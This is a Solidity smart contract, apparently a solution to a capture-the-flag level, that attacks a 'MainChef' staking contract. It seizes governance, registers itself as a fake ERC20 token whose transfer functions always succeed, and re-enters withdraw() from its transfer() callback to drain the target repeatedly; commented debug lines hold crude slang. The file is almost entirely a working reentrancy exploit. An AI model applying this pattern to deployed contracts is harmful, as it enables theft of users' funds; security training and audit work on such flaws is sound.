import "../levels/MainChef.sol";
import "hardhat/console.sol";

contract MainChefAttack {
    uint pwned;
    uint tradeId;
    MainChef target;

    constructor(MainChef _target) public {
        target = _target;
        pwned = 0;
    }

    function prepare() public {
        target.setGovernance(address(this));
        target.addToken(IERC20(address(this)));
        //console.log("EBAAAT 1 %s", target.khinkal().balanceOf(address(this)), target.khinkal().balanceOf(address(target)));
        target.deposit(1, 1000010638528069504);
        //console.log("EBAAAT 2 %s", target.khinkal().balanceOf(address(this)), target.khinkal().balanceOf(address(target)));
    }

    function hack() public {
        target.withdraw(1);
    }
    
    //function safeTransferFrom(address a, address b, uint c) external {
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        return true;
    }

    function balanceOf(address a) external returns (uint) {
        return 1e18;
    }

    //function safeTransfer(address a, uint b) external {
    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
      //console.log("SCHLYUXA %s", amount);
      //console.log("EBAAAT %s", target.khinkal().balanceOf(address(target)));
      if(pwned > 2) return true;
      pwned += 1;
      target.withdraw(1);
      return true;
    }
}
